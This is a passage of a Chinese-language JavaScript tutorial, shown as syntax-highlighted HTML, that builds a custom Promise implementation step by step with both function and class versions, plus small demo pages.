class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p2 = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;Success&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p3 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;Oh Yeah&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//调用 race 方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> result = <span class="title class_">Promise</span>.<span class="title function_">race</span>([p1, p2, p3]);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="then回调函数异步执行的实现"><a href="#then回调函数异步执行的实现" class="headerlink" title="then回调函数异步执行的实现"></a>then回调函数异步执行的实现</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//声明属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span> = [];</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//调用成功的回调函数</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">                item.<span class="title function_">onResolved</span>(data);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//执行失败的回调</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">                item.<span class="title function_">onRejected</span>(data);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="comment">//判断回调函数参数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> onRejected !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">        onRejected = <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> reason;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> onResolved !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">        onResolved = <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">        <span class="comment">//value =&gt; &#123; return value&#125;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//封装函数</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">type</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//获取回调函数的执行结果</span></span><br><span class="line">                <span class="keyword">let</span> result = <span class="title function_">type</span>(self.<span class="property">PromiseResult</span>);</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                    <span class="comment">//如果是 Promise 类型的对象</span></span><br><span class="line">                    result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(v);</span><br><span class="line">                    &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                        <span class="title function_">reject</span>(r);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//结果的对象状态为『成功』</span></span><br><span class="line">                    <span class="title function_">resolve</span>(result);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="title function_">reject</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">callback</span>(onResolved);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">callback</span>(onRejected);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断 pending 状态</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//保存回调函数</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">onResolved</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onResolved);</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onRejected</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onRejected);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 catch 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">catch</span> = <span class="keyword">function</span>(<span class="params">onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">then</span>(<span class="literal">undefined</span>, onRejected);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 resolve 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">resolve</span> = <span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="comment">//返回promise对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(value <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">            value.<span class="title function_">then</span>(<span class="function"><span class="params">v</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="title function_">resolve</span>(v);</span><br><span class="line">            &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="title function_">reject</span>(r);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//状态设置为成功</span></span><br><span class="line">            <span class="title function_">resolve</span>(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 reject 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">reject</span> = <span class="keyword">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="title function_">reject</span>(reason);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 all 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">all</span> = <span class="keyword">function</span>(<span class="params">promises</span>)&#123;</span><br><span class="line">    <span class="comment">//返回结果为promise对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//声明变量</span></span><br><span class="line">        <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> arr = [];</span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;promises.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            promises[i].<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">//得知对象的状态是成功</span></span><br><span class="line">                <span class="comment">//每个promise对象 都成功</span></span><br><span class="line">                count++;</span><br><span class="line">                <span class="comment">//将当前promise对象成功的结果 存入到数组中</span></span><br><span class="line">                arr[i] = v;</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(count === promises.<span class="property">length</span>)&#123;</span><br><span class="line">                    <span class="comment">//修改状态</span></span><br><span class="line">                    <span class="title function_">resolve</span>(arr);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">reject</span>(r);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 race 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">race</span> = <span class="keyword">function</span>(<span class="params">promises</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;promises.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            promises[i].<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">//修改返回对象的状态为 『成功』</span></span><br><span class="line">                <span class="title function_">resolve</span>(v);</span><br><span class="line">            &#125;,<span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="comment">//修改返回对象的状态为 『失败』</span></span><br><span class="line">                <span class="title function_">reject</span>(r);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 16 - 回调函数『异步执行』<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">reject</span>(<span class="string">&#x27;OK&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    p1.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">444</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">333</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 执行结果</span><br><span class="line">111</span><br><span class="line">333</span><br><span class="line">444</span><br></pre></td></tr></table></figure><h2 id="class版本封装"><a href="#class版本封装" class="headerlink" title="class版本封装"></a>class版本封装</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 封装类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Promise</span>&#123;</span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">        <span class="comment">//添加属性</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//声明属性</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">callbacks</span> = [];</span><br><span class="line">        <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">        <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">        <span class="comment">//resolve 函数</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">            <span class="comment">//判断状态</span></span><br><span class="line">            <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">            self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">            <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">            self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">            <span class="comment">//调用成功的回调函数</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">                    item.<span class="title function_">onResolved</span>(data);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//reject 函数</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">            <span class="comment">//判断状态</span></span><br><span class="line">            <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">            self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">            <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">            self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">            <span class="comment">//执行失败的回调</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">                    item.<span class="title function_">onRejected</span>(data);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">            <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">            <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">            <span class="title function_">reject</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//then 方法封装</span></span><br><span class="line">    <span class="title function_">then</span>(<span class="params">onResolved,onRejected</span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">        <span class="comment">//判断回调函数参数</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> onRejected !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">            onRejected = <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> reason;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> onResolved !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">            onResolved = <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">            <span class="comment">//value =&gt; &#123; return value&#125;;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//封装函数</span></span><br><span class="line">            <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">type</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">//获取回调函数的执行结果</span></span><br><span class="line">                    <span class="keyword">let</span> result = <span class="title function_">type</span>(self.<span class="property">PromiseResult</span>);</span><br><span class="line">                    <span class="comment">//判断</span></span><br><span class="line">                    <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                        <span class="comment">//如果是 Promise 类型的对象</span></span><br><span class="line">                        result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                            <span class="title function_">resolve</span>(v);</span><br><span class="line">                        &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                            <span class="title function_">reject</span>(r);</span><br><span class="line">                        &#125;)</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="comment">//结果的对象状态为『成功』</span></span><br><span class="line">                        <span class="title function_">resolve</span>(result);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                    <span class="title function_">reject</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onResolved);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onRejected);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//判断 pending 状态</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//保存回调函数</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                    <span class="attr">onResolved</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                        <span class="title function_">callback</span>(onResolved);</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">onRejected</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                        <span class="title function_">callback</span>(onRejected);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//catch 方法</span></span><br><span class="line">    <span class="keyword">catch</span>(onRejected)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">then</span>(<span class="literal">undefined</span>, onRejected);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加 resolve 方法，static关键字描述，resolve表明是静态成员，属于类（构造函数Promise），不属于实例对象</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">resolve</span>(<span class="params">value</span>)&#123;</span><br><span class="line">        <span class="comment">//返回promise对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(value <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                value.<span class="title function_">then</span>(<span class="function"><span class="params">v</span>=&gt;</span>&#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(v);</span><br><span class="line">                &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                    <span class="title function_">reject</span>(r);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//状态设置为成功</span></span><br><span class="line">                <span class="title function_">resolve</span>(value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加 reject 方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">reject</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="title function_">reject</span>(reason);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加 all 方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">all</span>(<span class="params">promises</span>)&#123;</span><br><span class="line">        <span class="comment">//返回结果为promise对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//声明变量</span></span><br><span class="line">            <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">let</span> arr = [];</span><br><span class="line">            <span class="comment">//遍历</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;promises.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                promises[i].<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">//得知对象的状态是成功</span></span><br><span class="line">                    <span class="comment">//每个promise对象 都成功</span></span><br><span class="line">                    count++;</span><br><span class="line">                    <span class="comment">//将当前promise对象成功的结果 存入到数组中</span></span><br><span class="line">                    arr[i] = v;</span><br><span class="line">                    <span class="comment">//判断</span></span><br><span class="line">                    <span class="keyword">if</span>(count === promises.<span class="property">length</span>)&#123;</span><br><span class="line">                        <span class="comment">//修改状态</span></span><br><span class="line">                        <span class="title function_">resolve</span>(arr);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;, <span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(r);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加 race 方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">race</span>(<span class="params">promises</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;promises.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                promises[i].<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">//修改返回对象的状态为 『成功』</span></span><br><span class="line">                    <span class="title function_">resolve</span>(v);</span><br><span class="line">                &#125;,<span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span 